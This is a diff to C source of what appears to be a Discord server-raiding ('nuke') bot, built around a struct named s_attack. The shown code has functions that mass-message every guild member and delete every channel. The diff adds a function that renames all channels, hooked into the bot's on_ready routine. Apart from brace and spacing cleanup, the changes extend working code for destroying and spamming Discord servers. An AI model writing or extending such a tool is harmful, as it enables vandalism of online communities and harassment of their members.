@@ -85,7 +85,7 @@ void dm_all(struct discord *client, u64_snowflake_t guild_id,
 
     int i = 0;
 
-    struct discord_channel dm_channel = { 0 };
+    struct discord_channel dm_channel = {0};
 
     while (members[i])
     {
@@ -106,14 +106,38 @@ void dm_all(struct discord *client, u64_snowflake_t guild_id,
     }
 }
 
-void delete_all_channels(struct discord *client, u64_snowflake_t guild_id) {
+void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
+{
     struct discord_channel **channels;
 
     discord_get_guild_channels(client, guild_id, &channels);
 
     int i = 0;
-    while(channels[i]) {
+    while (channels[i])
+    {
         discord_delete_channel(client, channels[i]->id, NULL);
+        i++;
+    }
+}
+
+void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
+                         char c_name[30])
+{
+    char *channel_name = strtok(c_name, "");
+    struct discord_channel **channels;
+
+    discord_get_guild_channels(client, guild_id, &channels);
+
+    int i = 0;
+    while (channels[i])
+    {
+        discord_modify_channel(
+            client,
+            channels[i]->id,
+            &(struct discord_modify_channel_params){
+                .name = channel_name
+            },
+            NULL);
         i++;
     }
 }
@@ -140,8 +164,14 @@ void on_ready(struct discord *client)
     log_info("NAME: %s", s_attack.mass_channel_name);
     u64_snowflake_t guild_id = get_guild(client);
 
-    if(s_attack.channel_delete_all == true) {
+    if (s_attack.channel_delete_all == true)
+    {
         delete_all_channels(client, guild_id);
+    }
+
+    if(s_attack.rename_channel_enabled == true) 
+    {
+        rename_all_channels(client, guild_id, s_attack.rename_channel_name);
     }
 
     if (s_attack.mass_channel_enabled == true)
